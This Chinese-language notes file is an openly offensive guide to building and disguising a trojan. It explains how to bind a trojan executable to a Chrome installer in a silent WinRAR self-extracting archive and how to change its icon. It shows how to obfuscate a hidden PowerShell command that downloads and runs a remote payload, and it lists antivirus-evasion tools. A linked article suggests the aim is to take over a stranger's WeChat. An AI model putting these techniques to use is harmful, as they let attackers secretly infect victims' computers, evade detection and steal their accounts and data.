# 制作木马
## vs2019修改exe图标 
[记一次拿图书馆小姐姐微信的全过程](https://mp.weixin.qq.com/s/LB_UrYMYYY7M3Ryhv8quFw)

## 打包木马和Chrome打包
1.选中Chrome安装包和 木马.exe
2.右击添加到winrar
3.General - ✔️Create SFX archive
4.Advanced - SFX options
4.1 General - C:\Users\Public
4.2 Setup - Run after extraction: C:\Users\Public\yiye1010.exe
4.3 Setup - Run before extraction: C:\Users\Public\ChromeSetup.exe
4.4 Modes - Hide all
4.5 Update - Extract and update files
5. Restorator修改图标
```bash
WinRAR a -sfx -iicond:\app.ico setup.exe

winrar a -v360 1 -sfx  # 360k分卷
WinRAR a -sfxWinCon.SFX Gift.rar
```

## Invoke-Obfuscation 制作 powershell免杀
```bash
# https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module .\Invoke-Obfuscation.psd1;Invoke-Obfuscation
Invoke-Obfuscation
set scriptblock 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:80/b'))"'
token\all\1
# encoding <enter> 1 <enter> ascii混淆
# encoding\1
out PowerShellCodeASCII.ps1
```

# 免杀工具
1.Themida
2.掩日免杀